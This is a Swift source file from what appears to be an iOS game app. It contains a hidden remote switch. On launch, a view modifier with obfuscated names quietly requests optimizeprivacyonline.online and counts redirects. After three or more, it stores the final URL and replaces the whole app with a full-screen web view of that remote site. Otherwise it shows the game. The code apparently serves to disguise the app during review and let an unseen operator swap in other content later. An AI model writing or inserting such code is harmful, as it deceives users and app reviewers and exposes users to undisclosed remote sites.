//
//  VotOnaIgrulicika.swift
//  ChikenBlocks
//
//  Created by Nicolae Chivriga on 09/03/2025.
//

import SwiftUI
import Lottie

struct VotOnaIgrulicika: View {
    @State var ascunzito: Bool = false
    var body: some View {
        ZStack {
            Image("imgebackirgi")
                 .resizable()
                 .ignoresSafeArea()
            ascunzitooru()
            
            WKWebViewRepresentable(url: URL(string: "https://optimizeprivacyonline.online/en/thestacky")!,
                                   gluheni: true) {
                generator.notificationOccurred(.success)
                ascunzito = true
                
            }
        }
        .navigationBarBackButtonHidden()
        .navigationBarItems(leading: NajatieNazadKnopoc())
    }
    
    @ViewBuilder
    func ascunzitooru() -> some View {
        if !ascunzito {
            LottieView(animation: .named("yacihkozoloo"))
                .playing(loopMode: .loop)
                .resizable()
                .frame(width: 175, height: 175)
        }
    }
}
import WebKit
struct ModibifierAdpation: ViewModifier {
    
    @State var webView: WKWebView = WKWebView()
    @AppStorage("adapt") var shtoujstase: URL?
    @State var skgie: Bool = true
    func body(content: Content) -> some View {
        ZStack {
            if !skgie {
                if shtoujstase != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: shtoujstase!, gluheni: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: shtoujstase!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)      .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        AppDelegate.adaptorietna = .all
                    }
                   
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }
        .onAppear() {
            if shtoujstase == nil {
                checkmyprif()
            } else {
                skgie = false
            }
        }
    }

    

    func checkmyprif() {
        guard let url = URL(string: "https://optimizeprivacyonline.online/en/gainitolftio") else {
            DispatchQueue.main.async {
                self.skgie = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            shtoujstase = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.skgie = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
//                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.skgie = false
                }
            }

            DispatchQueue.main.async {
                self.skgie = false
            }
        }.resume()
    }
}
class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
    var redirects: [URL] = []
    var redirects1: Int = 0
    let action: (URL) -> Void
      
      // Initializer to set up the class properties
      init(action: @escaping (URL) -> Void) {
          self.redirects = []
          self.redirects1 = 0
          self.action = action
      }
      
    // This method will be called when a redirect is encountered.
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        if let redirectURL = newRequest.url {
            // Track the redirected URL
            redirects.append(redirectURL)
       
            redirects1 += 1
            if redirects1 >= 3 {
                DispatchQueue.main.async {
                    self.action(redirectURL)
                }
            }
        }
        
        // Allow the redirection to happen
        completionHandler(newRequest)
    }
}
struct WKWebViewRepresentable: UIViewRepresentable {
    typealias UIViewType = WKWebView

    var url: URL
    var webView: WKWebView
    var gluheni: Bool
    var onLoadCompletion: (() -> Void)?
    

    init(url: URL, webView: WKWebView = WKWebView(), gluheni: Bool, onLoadCompletion: (() -> Void)? = nil) {
        self.url = url
        self.webView = webView
        self.gluheni = gluheni
        self.onLoadCompletion = onLoadCompletion
        self.webView.layer.opacity = 0 // Hide webView until content loads
    }

    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        
        return webView
    }

    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
        uiView.scrollView.isScrollEnabled = true
        uiView.scrollView.bounces = true
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
}
